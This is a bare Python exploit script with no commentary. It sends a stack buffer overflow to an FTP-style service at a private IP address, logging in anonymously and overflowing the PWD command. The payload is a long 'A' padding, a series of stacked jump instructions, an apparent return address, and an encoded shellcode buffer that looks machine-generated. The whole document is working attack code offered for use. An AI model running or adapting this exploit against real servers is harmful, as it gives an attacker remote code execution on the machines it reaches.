#!/usr/bin/python
import socket,time

buf =  ""
buf += "\xbb\x49\x08\xb8\x12\xda\xc3\xd9\x74\x24\xf4\x5f\x33"
buf += "\xc9\xb1\x52\x83\xc7\x04\x31\x5f\x0e\x03\x16\x06\x5a"
buf += "\xe7\x54\xfe\x18\x08\xa4\xff\x7c\x80\x41\xce\xbc\xf6"
buf += "\x02\x61\x0d\x7c\x46\x8e\xe6\xd0\x72\x05\x8a\xfc\x75"
buf += "\xae\x21\xdb\xb8\x2f\x19\x1f\xdb\xb3\x60\x4c\x3b\x8d"
buf += "\xaa\x81\x3a\xca\xd7\x68\x6e\x83\x9c\xdf\x9e\xa0\xe9"
buf += "\xe3\x15\xfa\xfc\x63\xca\x4b\xfe\x42\x5d\xc7\x59\x45"
buf += "\x5c\x04\xd2\xcc\x46\x49\xdf\x87\xfd\xb9\xab\x19\xd7"
buf += "\xf3\x54\xb5\x16\x3c\xa7\xc7\x5f\xfb\x58\xb2\xa9\xff"
buf += "\xe5\xc5\x6e\x7d\x32\x43\x74\x25\xb1\xf3\x50\xd7\x16"
buf += "\x65\x13\xdb\xd3\xe1\x7b\xf8\xe2\x26\xf0\x04\x6e\xc9"
buf += "\xd6\x8c\x34\xee\xf2\xd5\xef\x8f\xa3\xb3\x5e\xaf\xb3"
buf += "\x1b\x3e\x15\xb8\xb6\x2b\x24\xe3\xde\x98\x05\x1b\x1f"
buf += "\xb7\x1e\x68\x2d\x18\xb5\xe6\x1d\xd1\x13\xf1\x62\xc8"
buf += "\xe4\x6d\x9d\xf3\x14\xa4\x5a\xa7\x44\xde\x4b\xc8\x0e"
buf += "\x1e\x73\x1d\x80\x4e\xdb\xce\x61\x3e\x9b\xbe\x09\x54"
buf += "\x14\xe0\x2a\x57\xfe\x89\xc1\xa2\x69\x76\xbd\xac\x19"
buf += "\x1e\xbc\xac\xc6\x4e\x49\x4a\x92\x7e\x1c\xc5\x0b\xe6"
buf += "\x05\x9d\xaa\xe7\x93\xd8\xed\x6c\x10\x1d\xa3\x84\x5d"
buf += "\x0d\x54\x65\x28\x6f\xf3\x7a\x86\x07\x9f\xe9\x4d\xd7"
buf += "\xd6\x11\xda\x80\xbf\xe4\x13\x44\x52\x5e\x8a\x7a\xaf"
buf += "\x06\xf5\x3e\x74\xfb\xf8\xbf\xf9\x47\xdf\xaf\xc7\x48"
buf += "\x5b\x9b\x97\x1e\x35\x75\x5e\xc9\xf7\x2f\x08\xa6\x51"
buf += "\xa7\xcd\x84\x61\xb1\xd1\xc0\x17\x5d\x63\xbd\x61\x62"
buf += "\x4c\x29\x66\x1b\xb0\xc9\x89\xf6\x70\xe9\x6b\xd2\x8c"
buf += "\x82\x35\xb7\x2c\xcf\xc5\x62\x72\xf6\x45\x86\x0b\x0d"
buf += "\x55\xe3\x0e\x49\xd1\x18\x63\xc2\xb4\x1e\xd0\xe3\x9c"

jmp =  "\x83\xeb\x32" * 8
jmp += "\xff\xe3"

buffer = "A" * 1152 + "B" * (40 -len(jmp)) + jmp + "\x8f\xe8\xb1\x7c"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.0.112',8080))
time.sleep(1)
r = s.recv(2048)

s.send("USER anonymous\r\nn")
r = s.recv(1024)

s.send("PASS anonymous\r\n")
r = s.recv(1024)

s.send("PWD "+buffer+"\r\n")
r = s.recv(1024)